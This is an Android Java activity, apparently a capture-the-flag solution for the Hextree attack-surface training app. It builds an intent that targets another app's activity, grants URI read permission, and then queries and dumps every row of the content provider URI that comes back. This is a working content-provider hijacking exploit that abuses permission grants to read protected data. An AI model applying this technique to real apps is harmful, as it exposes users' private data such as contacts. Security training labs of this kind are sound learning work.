package com.hextree.getflag;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class ContentProviderHijacking extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable @org.jetbrains.annotations.Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity"));
        intent.setData(Uri.parse("content://com.android.contacts/raw_contacts"));
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivityForResult(intent, 1);
    }

    @SuppressLint("MissingSuperCall")
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable @org.jetbrains.annotations.Nullable Intent data) {
        Cursor cursor = getContentResolver().query(data.getData(), null, null,null, null);

        if (cursor!=null && cursor.moveToFirst()) {
            StringBuilder sb = new StringBuilder();
            do {
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0 && i != 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                sb.append("\n");
            } while (cursor.moveToNext());
            Utils.dumpQuery(ContentProviderHijacking.this, sb.toString());
        }
    }
}
